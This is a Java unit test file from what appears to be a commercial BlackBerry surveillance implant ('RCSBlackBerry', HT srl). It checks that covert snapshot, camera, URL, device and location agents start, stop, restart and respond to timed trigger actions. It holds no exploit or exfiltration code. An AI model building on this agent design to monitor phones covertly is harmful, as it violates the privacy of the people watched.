//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : tests.unit
 * File         : UT_Agents.java
 * Created      : 28-apr-2010
 * *************************************************/
package tests.unit;

import java.util.Vector;

import net.rim.device.api.util.DataBuffer;
import tests.AssertException;
import tests.TestUnit;
import tests.Tests;
import blackberry.AgentManager;
import blackberry.Conf;
import blackberry.EventManager;
import blackberry.Status;
import blackberry.action.Action;
import blackberry.action.SubAction;
import blackberry.agent.Agent;
import blackberry.event.Event;
import blackberry.event.TimerEvent;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class UT_Agents.
 */
public final class UT_Agents extends TestUnit {

    /**
     * Instantiates a new u t_ agents.
     * 
     * @param name
     *            the name
     * @param tests
     *            the tests
     */
    public UT_Agents(final String name, final Tests tests) {
        super(name, tests);
    }

    void AgentSnapshot() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("-- AgentSnapshot --");
        //#endif

        final Status status = Status.getInstance();
        status.clear();
        final AgentManager agentManager = AgentManager.getInstance();

        final byte[] conf = new byte[8];
        final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length,
                false);
        databuffer.writeInt(10000);
        databuffer.writeInt(0);

        final Agent agent = Agent.factory(Agent.AGENT_SNAPSHOT, true, conf);
        AssertNotNull(agent, "Agent");

        status.addAgent(agent);

        AssertThat(agent.isEnabled(), "Agent not Enabled 1");

        agentManager.startAll();
        Utils.sleep(400);

        agentManager.stopAll();

        //#ifdef DEBUG_TRACE
        debug.trace("-- AgentSnapshot OK --");

        //#endif
    }

    /**
     * Execute action.
     * 
     * @param action
     *            the action
     * @return true, if successful
     */
    private boolean ExecuteAction(final Action action) {
        final Vector subActions = action.getSubActionsList();
        action.setTriggered(false, null);

        for (int j = 0; j < subActions.size(); j++) {

            final SubAction subAction = (SubAction) subActions.elementAt(j);
            final boolean ret = subAction.execute(null);

            if (ret == false) {
                break;
            }

            if (subAction.wantUninstall()) {
                //#ifdef DEBUG
                debug.warn("CheckActions() uninstalling");
                //#endif
                return false;
            }

            if (subAction.wantReload()) {
                //#ifdef DEBUG
                debug.warn("CheckActions() reloading");
                //#endif
                return true;
            }
        }

        return true;
    }

    void RestartAll() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("-- RestartAll --");
        //#endif
        final Status status = Status.getInstance();
        status.clear();
        final AgentManager agentManager = AgentManager.getInstance();

        final byte[] conf = new byte[8];
        final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length,
                false);
        databuffer.writeInt(10000);
        databuffer.writeInt(0);

        final Agent agent1 = Agent.factory(Agent.AGENT_SNAPSHOT, false, conf);
        AssertNotNull(agent1, "AGENT_SNAPSHOT");
        status.addAgent(agent1);

        final Agent agent2 = Agent
                .factory(Agent.AGENT_CAM, true, new byte[] {});
        AssertNotNull(agent2, "AGENT_CAM");
        status.addAgent(agent2);

        final Agent agent3 = Agent
                .factory(Agent.AGENT_URL, true, new byte[] {});
        AssertNotNull(agent3, "AGENT_URL");
        status.addAgent(agent3);

        AssertEqual(agent1.getRunningLoops(), 0,
                "Agent1.runningLoops should be 0");
        AssertEqual(agent2.getRunningLoops(), 0,
                "Agent2.runningLoops should be 0");
        AssertEqual(agent3.getRunningLoops(), 0,
                "Agent3.runningLoops should be 0");

        // partenza di tutti e tre gli agenti, il primo e' disabilitato

        //#ifdef DEBUG_TRACE
        debug.trace("1");

        //#endif
        boolean ret = agentManager.startAll();
        AssertThat(ret, "cannot start all");

        Utils.sleep(1000);

        AssertEqual(agent1.getRunningLoops(), 0,
                "Agent1.runningLoops should be 0");
        AssertEqual(agent2.getRunningLoops(), 1,
                "Agent2.runningLoops should be 1");
        AssertEqual(agent3.getRunningLoops(), 1,
                "Agent3.runningLoops should be 1");

        // verifico che solo due siano running e enabled
        //#ifdef DEBUG_TRACE
        debug.trace("2");
        //#endif
        AssertThat(!agent1.isRunning(), "agent1 should not run");
        AssertThat(agent2.isRunning(), "agent2 should run");
        AssertThat(agent3.isRunning(), "agent3 should run");

        AssertThat(!agent1.isEnabled(), "agent1 should not be enabled");
        AssertThat(agent2.isEnabled(), "agent2 should be enabled");
        AssertThat(agent3.isEnabled(), "agent3 should be enabled");

        // restartAgent1
        agentManager.reStart(agent1.agentId);
        // restartAgent2
        agentManager.reStart(agent2.agentId);

        Utils.sleep(2000);

        //#ifdef DEBUG_TRACE
        debug.trace("3");

        //#endif
        AssertEqual(agent1.getRunningLoops(), 0,
                "Agent1.runningLoops should be 0");
        AssertEqual(agent2.getRunningLoops(), 2,
                "Agent2.runningLoops should be 2");
        AssertEqual(agent3.getRunningLoops(), 1,
                "Agent3.runningLoops should be 1");

        AssertThat(!agent1.isRunning(), "agent1 should not run");
        AssertThat(agent2.isRunning(), "agent2 should run");
        AssertThat(agent3.isRunning(), "agent3 should run");

        AssertThat(!agent1.isEnabled(), "agent1 should not be enabled");
        AssertThat(agent2.isEnabled(), "agent2 should be enabled");
        AssertThat(agent3.isEnabled(), "agent3 should be enabled");

        // restartAgent3
        agentManager.reStart(agent3.agentId);

        Utils.sleep(2000);
        //#ifdef DEBUG_TRACE
        debug.trace("4");
        //#endif

        AssertEqual(agent1.getRunningLoops(), 0,
                "Agent1.runningLoops should be 0");
        AssertEqual(agent2.getRunningLoops(), 2,
                "Agent2.runningLoops should be 2");
        AssertEqual(agent3.getRunningLoops(), 2,
                "Agent3.runningLoops should be 2");

        AssertThat(!agent1.isRunning(), "agent1 should not run");
        AssertThat(agent2.isRunning(), "agent2 should run");
        AssertThat(agent3.isRunning(), "agent3 should run");

        AssertThat(!agent1.isEnabled(), "agent1 should not be enabled");
        AssertThat(agent2.isEnabled(), "agent2 should be enabled");
        AssertThat(agent3.isEnabled(), "agent3 should be enabled");

        // stop all
        //#ifdef DEBUG_TRACE
        debug.trace("5");
        //#endif
        ret = agentManager.stopAll();
        AssertThat(ret, "cannot stop all");

        AssertThat(!agent1.isRunning(), "agent1 should not run");
        AssertThat(!agent2.isRunning(), "agent2 should not run");
        AssertThat(!agent3.isRunning(), "agent3 should not run");

        //#ifdef DEBUG_TRACE
        debug.trace("-- RestartAll OK --");

        //#endif
    }

    /**
     * Start and stop.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean StartAndStop() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("-- StartAndStop --");
        //#endif

        final Status status = Status.getInstance();
        status.clear();
        final AgentManager agentManager = AgentManager.getInstance();

        final Agent agent = Agent.factory(Agent.AGENT_DEVICE, true, Utils
                .intToByteArray(1));
        AssertNotNull(agent, "Agent");

        status.addAgent(agent);

        AssertThat(agent.isEnabled(), "Agent not Enabled 1");

        // start all
        agentManager.startAll();
        Utils.sleep(1000);

        AssertThat(agent.isRunning(), "Agent not Running 1");

        // stop all
        agentManager.stopAll();

        Utils.sleep(1000);
        AssertThat(agent.isEnabled(), "Agent not Enabled 2");
        AssertThat(!agent.isRunning(), "Agent still running");

        // start agent
        agentManager.start(agent.agentId);
        Utils.sleep(1000);

        AssertThat(agent.isRunning(), "Agent not Running 1");

        // stop agent
        agentManager.stop(agent.agentId);

        Utils.sleep(1000);
        AssertThat(agent.isEnabled(), "Agent not Enabled 2");
        AssertThat(!agent.isRunning(), "Agent still running");

        //#ifdef DEBUG_TRACE
        debug.trace("-- StartAndStop OK --");

        //#endif
        return true;
    }

    /**
     * Start stop agent.
     * 
     * @return true, if successful
     * @throws AssertException
     *             the assert exception
     */
    boolean StartStopAgent() throws AssertException {
        //#ifdef DEBUG_INFO
        debug.info("-- StartStopAgent --");
        //#endif

        final Status status = Status.getInstance();
        status.clear();
        final AgentManager agentManager = AgentManager.getInstance();
        final EventManager eventManager = EventManager.getInstance();

        // genero due agenti, di cui uno disabled
        //#ifdef DEBUG_TRACE
        debug.trace("agent");
        //#endif
        final Agent agentDevice = Agent.factory(Agent.AGENT_DEVICE, true, Utils
                .intToByteArray(0));
        status.addAgent(agentDevice);
        final Agent agentPosition = Agent.factory(Agent.AGENT_POSITION, false,
                new byte[] {});
        status.addAgent(agentPosition);

        // eseguo gli agenti
        //#ifdef DEBUG_TRACE
        debug.trace("start agent");
        //#endif
        agentManager.startAll();
        Utils.sleep(400);

        // verifico che uno solo parta
        //#ifdef DEBUG_TRACE
        debug.trace("one running");
        //#endif
        AssertThat(agentDevice.isRunning(), "Agent not Running 2");
        AssertThat(!agentPosition.isEnabled(), "Agent not disabled 1");

        // Creo azione 0 che fa partire l'agent position
        //#ifdef DEBUG_TRACE
        debug.trace("action 0");
        //#endif
        final Action action0 = new Action(0);
        final byte[] confParams = new byte[4];
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        databuffer.writeInt(Agent.AGENT_POSITION);

        action0.addNewSubAction(SubAction.ACTION_START_AGENT, confParams);
        status.addAction(action0);

        // Creo azione 1 che fa ferma l'agent position
        //#ifdef DEBUG_TRACE
        debug.trace("action 1");
        //#endif
        final Action action1 = new Action(1);
        action1.addNewSubAction(SubAction.ACTION_STOP_AGENT, confParams);
        status.addAction(action1);

        // Creo l'evento timer che esegue azione 0
        //#ifdef DEBUG_TRACE
        debug.trace("event 0");
        //#endif
        final Event event0 = new TimerEvent(0, Conf.CONF_TIMER_SINGLE, 2000, 0);
        status.addEvent(0, event0);

        // Creo eveneto timer che esegue azione 1
        //#ifdef DEBUG_TRACE
        debug.trace("event 1");
        //#endif
        final Event event1 = new TimerEvent(1, Conf.CONF_TIMER_SINGLE, 4000, 0);
        status.addEvent(1, event1);

        AssertThat(!event0.isRunning(), "Event0 running");
        AssertThat(!event1.isRunning(), "Event1 running");

        // lancio i thread degli eventi
        //#ifdef DEBUG_TRACE
        debug.trace("start event");
        //#endif
        eventManager.startAll();

        // verifico che gli eventi siano partiti.
        Utils.sleep(500);
        //#ifdef DEBUG_TRACE
        debug.trace("event running");
        //#endif
        AssertThat(event0.isScheduled(), "Event0 not scheduled 1");
        AssertThat(event1.isScheduled(), "Event1 not scheduled 1");
        AssertThat(!event0.isRunning(), "Event0 running");
        AssertThat(!event1.isRunning(), "Event1 running");

        // verifica che dopo 2 secondo l'azione sia triggered
        Utils.sleep(2000);
        //#ifdef DEBUG_TRACE
        debug.trace("triggered 0");
        //#endif
        AssertThat(action0.isTriggered(), "action0 not triggered 1");
        AssertThat(!action1.isTriggered(), "action1 triggered 1");

        //#ifdef DEBUG_TRACE
        debug.trace("action 0");

        //#endif
        ExecuteAction(action0);
        Utils.sleep(500);

        AssertThat(agentDevice.isRunning(), "Agent not Running 3");
        AssertThat(agentPosition.isRunning(), "Agent not Running 4");

        // verifica che dopo 2 secondi l'azione 1 sia triggered
        Utils.sleep(2000);
        //#ifdef DEBUG_TRACE
        debug.trace("triggered 1");
        //#endif
        AssertThat(action1.isTriggered(), "action1 not triggered 2");
        AssertThat(!action0.isTriggered(), "action0 triggered 2");

        //#ifdef DEBUG_TRACE
        debug.trace("action 1");

        //#endif
        ExecuteAction(action1);
        Utils.sleep(500);

        AssertThat(agentDevice.isRunning(), "Agent not Running 5");
        AssertThat(agentPosition.isEnabled(), "Agent not enabled 1");

        AssertThat(event0.isRunning(), "Event0 running");
        AssertThat(event1.isRunning(), "Event1 running");
        AssertThat(!action0.isTriggered(), "action0 triggered");
        AssertThat(!action1.isTriggered(), "action1 triggered");

        // fermo gli eventi
        //#ifdef DEBUG_TRACE
        debug.trace("stop event");
        //#endif
        eventManager.stopAll();

        AssertThat(!event0.isRunning(), "Event0 running");
        AssertThat(!event1.isRunning(), "Event1 running");

        agentManager.stopAll();
        //#ifdef DEBUG_TRACE
        debug.trace("-- StartStopAgent OK --");
        //#endif
        return true;
    }

    /*
     * (non-Javadoc)
     * @see tests.TestUnit#run()
     */
    public boolean run() throws AssertException {

        StartAndStop();
        RestartAll();

        StartStopAgent();
        AgentSnapshot();

        return true;
    }
}
